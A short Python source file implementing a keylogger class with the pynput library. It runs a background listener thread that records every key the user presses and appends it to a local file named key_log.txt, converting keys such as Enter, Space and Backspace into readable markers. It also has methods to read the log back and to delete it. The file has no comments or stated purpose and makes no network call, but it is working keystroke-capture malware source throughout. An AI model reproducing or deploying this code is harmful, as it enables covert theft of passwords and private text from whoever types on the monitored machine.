from pynput.keyboard import Listener
import threading
import re
import os

class KeyLogger:
    keys = []
    count = 0
    path = 'key_log.txt'

    def start_listener(self):
        global listener
        with Listener(on_press=self.key_pressed) as listener:
            listener.join()

    def start_logger(self):
        self.t = threading.Thread(target=self.start_listener)
        self.t.start()

    def key_pressed(self, key):
        self.keys.append(key)
        self.count += 1
        if self.count >= 1:
            self.count = 0
            with open(self.path, 'a') as file:
                for i in self.keys:
                    i = re.sub("'", "", str(i))
                    if i == "Key.enter":
                        file.write("\n")
                    elif i in ("Key.shift",
                               "Key.shift_r",
                               "Key.ctrl",
                               "Key.escape",
                               "Key.cmd"):
                        pass
                    elif i == "Key.backspace":
                        file.write(" [backspace] ")
                    elif i == "Key.space":
                        file.write(" ")
                    elif i == "Key.tab":
                        file.write(" [tab] ")
                    elif i == "Key.caps_lock":
                        file.write(" [capslock] ")
                    else:
                        file.write(i)
        self.keys = []

    def read_log(self):
        with open('key_log.txt', 'r') as file:
            data = file.read()
            return data
        
    def stop_listener(self):
        listener.stop()
        os.remove(self.path)
